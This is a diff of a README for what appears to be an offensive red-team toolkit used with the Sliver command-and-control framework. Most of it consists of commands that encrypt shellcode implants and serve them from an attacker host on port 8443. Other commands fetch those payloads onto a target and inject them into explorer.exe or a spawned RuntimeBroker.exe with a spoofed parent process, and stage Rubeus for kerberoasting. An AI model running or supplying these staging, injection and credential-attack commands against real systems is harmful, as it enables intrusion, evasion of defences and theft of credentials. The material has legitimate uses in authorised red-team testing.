@@ -99,10 +99,10 @@ make all
 
 # 3. Convert a binary and serve
 ./loadkit load --binary rubeus.exe --args "kerberoast /nowrap" \
-    --url https://YOUR_IP:8443/p --serve
+    --url https://YOUR_IP:8443 --serve
 
-# 4. Run in Sliver
-#    sliver (TARGET)> load url=https://YOUR_IP:8443/... key=<printed key>
+# 4. Run in Sliver (use the Staging URL printed above — random path auto-generated)
+#    sliver (TARGET)> load url=https://YOUR_IP:8443/<random-path> key=<printed key>
 ```
 
 Full docs: [Loader-Kit/DOCUMENTATION.md](Loader-Kit/DOCUMENTATION.md)
@@ -116,16 +116,16 @@ cd Inject-Kit/injectkit
 make all
 
 # 2. Encrypt shellcode and start staging server
-./injectkit stage --shellcode implant.bin --url https://YOUR_IP:8443/p --serve
+./injectkit stage --shellcode implant.bin --url https://YOUR_IP:8443 --serve
 
-# 3a. Standalone — run injectkit.exe directly on the target:
-#     injectkit.exe -mode stager -url https://YOUR_IP:8443/p -key <key> -target explorer.exe
-#     injectkit.exe -mode stager -url https://YOUR_IP:8443/p -key <key> -spawn RuntimeBroker.exe -ppid explorer.exe
+# 3a. Standalone — run injectkit.exe directly on the target (use Staging URL printed above):
+#     injectkit.exe -mode stager -url https://YOUR_IP:8443/<random-path> -key <key> -target explorer.exe
+#     injectkit.exe -mode stager -url https://YOUR_IP:8443/<random-path> -key <key> -spawn RuntimeBroker.exe -ppid explorer.exe
 
 # 3b. Sliver Extension — install once then use from any session:
 #     sliver (TARGET)> extensions install build/inject-0.1.0.tar.gz
-#     sliver (TARGET)> inject url=https://YOUR_IP:8443/p key=<key> target=explorer.exe
-#     sliver (TARGET)> inject url=https://YOUR_IP:8443/p key=<key> spawn=RuntimeBroker.exe ppid=explorer.exe
+#     sliver (TARGET)> inject url=https://YOUR_IP:8443/<random-path> key=<key> target=explorer.exe
+#     sliver (TARGET)> inject url=https://YOUR_IP:8443/<random-path> key=<key> spawn=RuntimeBroker.exe ppid=explorer.exe
 ```
 
 Full docs: [Inject-Kit/DOCUMENTATION.md](Inject-Kit/DOCUMENTATION.md)
@@ -160,8 +160,8 @@ cd ../../Crystal-Palace-Kit/palacekit
 ./palacekit build --shellcode masked.bin --output palace.bin
 
 # 3. Stage with InjectKit and inject into a spoofed process
-./injectkit stage --shellcode palace.bin --url https://YOUR_IP:8443/p --serve
-# sliver (TARGET)> inject url=... key=... spawn=RuntimeBroker.exe ppid=explorer.exe
+./injectkit stage --shellcode palace.bin --url https://YOUR_IP:8443 --serve
+# sliver (TARGET)> inject url=https://YOUR_IP:8443/<random-path> key=<printed key> spawn=RuntimeBroker.exe ppid=explorer.exe
 ```
 
 **In-memory tool execution with Crystal Kit staging:**
@@ -169,8 +169,8 @@ cd ../../Crystal-Palace-Kit/palacekit
 # Stage Rubeus via LoadKit, inside a session obtained via PalaceKit/InjectKit
 cd Loader-Kit/loadkit
 ./loadkit load --binary rubeus.exe --args "kerberoast /nowrap" \
-    --url https://YOUR_IP:8443/p --serve
-# sliver (TARGET)> load url=... key=...
+    --url https://YOUR_IP:8443 --serve
+# sliver (TARGET)> load url=https://YOUR_IP:8443/<random-path> key=<printed key>
 ```
 
 ---
